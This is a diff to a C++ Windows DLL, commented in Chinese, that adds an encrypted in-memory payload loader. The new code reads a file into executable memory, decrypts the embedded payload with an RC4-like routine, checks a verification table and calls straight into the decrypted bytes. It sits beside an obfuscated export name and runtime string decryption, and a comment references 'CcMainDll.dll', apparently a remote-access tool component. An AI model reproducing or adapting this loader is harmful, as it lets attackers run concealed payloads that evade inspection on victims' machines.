@@ -1,7 +1,11 @@
 ﻿// dllmain.cpp : 定义 DLL 应用程序的入口点。
 #include "pch.h"
+#include <iostream>
 
 #define STR_CRY_LENGTH			0	//加密字符串的长度
+#define SIZE 256
+
+
 char* uncode(char* str)
 {
 	int len = str[0];
@@ -50,6 +54,94 @@ extern "C" __declspec(dllexport) void eiwqiothhahndna()
 
 }
 
+
+//------------------------------------------------------------
+//加密前的密码表
+// Size    : 256 (0x100)
+//------------------------------------------------------------
+unsigned char EncryptTable[256] = { 0 };
+
+//------------------------------------------------------------
+//加密后的密码表，可用于解密时的校验
+// Size    : 256 (0x100)
+//------------------------------------------------------------
+unsigned char ChcekTable[256] = { 0 };
+
+
+
+void EncryptFunc(unsigned char *SourceBytes, unsigned char *EncryptBytes, DWORD nLength)
+{
+	DWORD nOffsetNum = 0, nTargetNum = 0, nLastNum = 0;
+	unsigned char TargetCode = '\x0', OffsetCode = '\x0', LastCode = '\x0';
+	for (DWORD i = 0; i < nLength; i++)
+	{
+		//取密码表标志位Code
+		TargetCode = EncryptBytes[((i + 1) % 0x100)];
+		//取偏移Code的偏移
+		nOffsetNum = (TargetCode + nOffsetNum) % 0x100;
+		//取密码表偏移Code
+		OffsetCode = EncryptBytes[nOffsetNum];
+		//交换密码表数值
+		EncryptBytes[nOffsetNum % 0x100] = EncryptBytes[((i + 1) % 0x100)];
+		EncryptBytes[((i + 1) % 0x100)] = OffsetCode;
+		//取最终加密Code偏移
+		nLastNum = (TargetCode + OffsetCode) % 0x100;
+		//获取异或用的字符串
+		LastCode = EncryptBytes[nLastNum];
+		//取被加密的字符,异或
+		SourceBytes[i] ^= LastCode;
+	}
+	//在此下断观察SourceBytes和CryptData
+	return;
+}
+
+
+FILE * pFile;
+long lSize;
+unsigned char * buffer;
+size_t result;
+
+bool InitTestReflectiveLoader(char * SelfPath)
+{
+	// 一个不漏地读入整个文件，只能采用二进制方式打开
+	//pFile = fopen(".\\..\\..\\bin\\server\\CcMainDll.dll", "rb");
+	pFile = fopen(SelfPath, "rb");
+
+	if (pFile == NULL)
+	{
+		fputs("File error", stderr);
+		//printf("open file fail");
+		return false;
+	}
+
+	// 获取文件大小 
+	fseek(pFile, 0, SEEK_END);
+	lSize = ftell(pFile);
+	rewind(pFile);
+
+	// 分配内存存储整个文件
+	buffer = (unsigned char*)VirtualAlloc(NULL, sizeof(char)*lSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+	if (buffer == NULL)
+	{
+		fputs("Memory error", stderr);
+		//printf("Memory alloc falil");
+		return false;
+
+	}
+
+	// 将文件拷贝到buffer中 
+	result = fread(buffer, 1, lSize, pFile);
+	if (result != lSize)
+	{
+		fputs("Reading error", stderr);
+		//printf("Load file to memory falil");
+		return false;
+
+	}
+	return true;
+
+}
 
 /*
 为什么C++生成的Dll函数名带有@？如“_Abcd2@4”后面是数字2加@还有个4
@@ -103,8 +195,31 @@ extern "C" __declspec(dllexport) int __stdcall run(HMODULE hLibModule)
 	memset(pMainDat, 0, Str_Kernel32[STR_CRY_LENGTH]);
 	delete pMainDat;
 
+	if (InitTestReflectiveLoader(SelfPath)) {
 
-	MessageBoxA(NULL, SelfPath, "test", NULL);
+
+		unsigned char * buffers = (unsigned char*)malloc(sizeof(char)*result - SIZE - SIZE);
+
+		memcpy(EncryptTable, buffer, SIZE);
+
+		memcpy(ChcekTable, buffer + SIZE, SIZE);
+
+		memcpy(buffers, buffer + SIZE + SIZE, result - SIZE - SIZE);
+
+		EncryptFunc(buffers, EncryptTable, result - SIZE - SIZE);
+
+		if (memcmp(ChcekTable, EncryptTable, SIZE) == 0)
+		{
+			DWORD lpflOldProtect = 0;
+			VirtualProtect(buffers, result - SIZE - SIZE, PAGE_EXECUTE_READWRITE, &lpflOldProtect);
+			__asm {
+				call buffers
+			}
+		}
+	}
+
+	
+
 
 
 	return FreeLibrary(hLibModule);
